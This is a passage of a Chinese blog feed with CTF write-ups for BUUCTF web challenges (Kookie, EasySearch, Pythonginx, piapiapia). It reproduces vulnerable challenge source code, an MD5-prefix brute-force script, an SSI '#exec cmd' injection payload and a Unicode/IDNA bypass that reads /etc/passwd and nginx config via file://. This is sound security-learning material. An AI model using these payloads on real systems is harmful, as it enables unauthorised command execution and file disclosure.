class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line"></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话题目就是考点</p><p>这里的代码有点长，就得考察代码审计能力了</p><p><a href="https://www.cnblogs.com/LEOGG321/p/13406418.html">详细的wp</a>   看这个wp就行了，这里就不多写了</p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>题目</p><p><img src="../images/image-20230410200301423.png" alt="image-20230410200301423"></p><p>这里跟据题目名字猜测跟cookie有关</p><p>抓包输入题目给的账号密码</p><p>然后登录成功</p><p><img src="../images/image-20230410200634909.png" alt="image-20230410200634909"></p><p>发现内容为username=cookie的键值对。</p><p>显然这里Cookie中的键值对的值作为了服务端在用户通过账户密码登录之后再次访问时验证身份的凭证，将其值改为admin也就标志我们成为了admin用户，接着再携带修改后的Cookie访问页面就能获得flag。</p><p><img src="../images/image-20230410201052297.png" alt="image-20230410201052297"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>题目</p><p><img src="../images/image-20230410201152027.png" alt="image-20230410201152027"></p><p>题目上要search</p><p>那么我们就扫一下目录</p><p><strong>扫后台发现index.php.swp备份。</strong></p><p><img src="../images/image-20230410201336318.png" alt="image-20230410201336318"></p><p><strong>一段代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要求password的md5值的前6个字符为6d0bc1。敲代码（python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410201840174.png" alt="image-20230410201840174"></p><p>发现三个数字可以是</p><p>然后进行登录</p><p><img src="../images/image-20230410201946697.png" alt="image-20230410201946697"></p><p>登录成功</p><p><img src="../images/image-20230410202019909.png" alt="image-20230410202019909"></p><p>发现请求头有个玩意</p><p><img src="../images/image-20230410202059718.png" alt="image-20230410202059718"></p><p>这里有个shtml的玩意</p><p>（shtml是一种基于SSI技术的文件。SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p><p>（SSI注入的条件：</p><p>1.Web 服务器已支持SSI（服务器端包含）</p><p>2.Web 应用程序未对对相关SSI关键字做过滤</p><p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410202410577.png" alt="image-20230410202410577"></p><p>这里就是shtml的注入点了，所以username就是注入点了</p><p>(也可以这样想，只有两个参数可控，passwd已经定死了，那么就只剩username可用了)</p><p><img src="../images/image-20230410202836563.png" alt="image-20230410202836563"></p><p><img src="../images/image-20230410202858401.png" alt="image-20230410202858401"></p><p>这里的话是一下一下给试出来的</p><p>分析一下代码逻辑就知道咋做了</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>题目</p><p><img src="../images/image-20230410203011922.png" alt="image-20230410203011922"></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410212124359.png" alt="image-20230410212124359"></p><p><strong>这里看不太懂就直接把代码分离出来看</strong></p><p>利用点在这里<code>urllib.request.urlopen(finalUrl).read()</code>，只要前两次<code>host != suctf.cc</code>，第三次<code>host == suctf.cc</code>即可</p><p><img src="../images/image-20230410212924771.png" alt="image-20230410212924771"></p><p>而这利用的关键在于<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code></p><p>编码问题，<code>Unicode</code>的很多字符经过这样的一番编码处理都可以得到正常的字母，脚本<strong>fuzz</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chars = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7f</span>, <span class="number">0x10FFFF</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">char_i = <span class="built_in">chr</span>(i).encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> char_i == c:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c, <span class="built_in">chr</span>(i), i))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410213251760.png" alt="image-20230410213251760"></p><p>这里的意思就是前两个没有进行这个编码，然后第三个之前就有一个编码，然后就会把原本的unicode编码给变成正常的编码了</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://𝑆uctf.cc/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410213759184.png" alt="image-20230410213759184"></p><p>然后就是找flag位置了</p><p><img src="../images/image-20230410213807929.png" alt="image-20230410213807929"></p><p>给了提示，然后就尝试访问nginx这个配置文件</p><p>Nginx<code>的配置文件网上位置有很多，这里能读取到的是</code>/usr/local/nginx/conf/nginx.conf</p><p><img src="../images/image-20230410213928964.png" alt="image-20230410213928964"></p><p>然后就是读取flag了</p><p><img src="../images/image-20230410214100651.png" alt="image-20230410214100651"></p><p>这就是验证过程了</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>题目</p><p><img src="../images/image-20230410214141340.png" alt="image-20230410214141340"></p><p><strong>这题考察的不是sql注入</strong>   这登录框确实有点欺骗的味道在</p><p>这个尝试一下常用的php文件，看能不能试出网站的目录</p><ul><li>注册账号<br>看来我们还是得老老实实得注册个账号来登录看看有什么功能点，并且熟悉网站结构。但是在登录页面又没有给出注册按钮，看来我们还得自己猜一下，通常是：/register.php。</li><li>浏览功能<br>登录成功后我们看到是一个上传个人信息的一个页面，看到可以上传图片，第一时间就想到了文件上传漏洞。我还是太年轻了，一波操作后没有饶得过。上传了一个正常的信息，发现跳转到profile.php展示出来我们的信息</li><li>目录扫面<br>功能都试过了，没有可以利用的地方（是我太菜）。我们可以扫一下目录，看看有什么隐藏的文件呀，信息泄露什么的，毕竟CTF很多题型是信息泄露+代码审计嘛。拿出御剑扫描后，浏览网页发现访问太快了，返回429状态码。看了网上大佬们的Writeup发现dirsearch可以扫描出来www.zip，我试了下dirsearch要记得加延时参数。<br>拿到了网站的源码我们的信息收集差不多就完了,我们现在可以在源码中寻找突破点</li></ul><p><img src="../images/image-20230411194146010.png" alt="image-20230411194146010"></p><p>这是注册完登录的界面</p><p>查看扫出来的网站目录   <code>www.zip</code>   得到下面的源码</p><p><img src="../images/image-20230411194253897.png" alt="image-20230411194253897"></p><p><strong>update.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  一眼可以看出这里用了一堆正则表达式来过滤我们提交的数据，而且第三个正则表达式和前面两个不一样，这里判断了nickname是否为字符还有长度是否超过10。用文章开头的知识点二，如果我们传入的nickname是一个数组，绕过长度的限制，则可以绕过这正则表达式，是我们不会die出。<br>  在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。<br>  我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p><p><strong>update_profile()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>filter()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>update()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p><p><strong>看wp吧  这里就不太想写了 </strong>      </p><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网鼎杯-2018-Fakebook&quot;&gt;&lt;a href=&quot;#网鼎杯-2018-Fakebook&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2018]Fakebook&quot;&gt;&lt;/a&gt;[网鼎杯 2018]Fakebook&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="buuctf 第二页" scheme="https://ke1nys.github.io/tags/buuctf-%E7%AC%AC%E4%BA%8C%E9%A1%B5/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-愚人杯</title>
    <link href="https://ke1nys.github.io/posts/28e06bac.html"/>
    <id>https://ke1nys.github.io/posts/28e06bac.html</id>
    <published>2023-04-03T15:16:52.000Z</published>
    <updated>2023-04-06T06:48:36.154Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h2><p>题目</p><p><img src="../images/image-20230404104706716.png" alt="image-20230404104706716"></p><p>一个表情包，然后url后面还跟着一段base64编码的内容，解码后查看时<strong>face.png</strong>，所以感觉这里存在<strong>文件包含或者文件查询</strong></p><p>然后就去查询<code>index.php</code>,然后就查看源码发现了一段base64编码的内容，然后拿去解码</p><p><strong>解码后的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 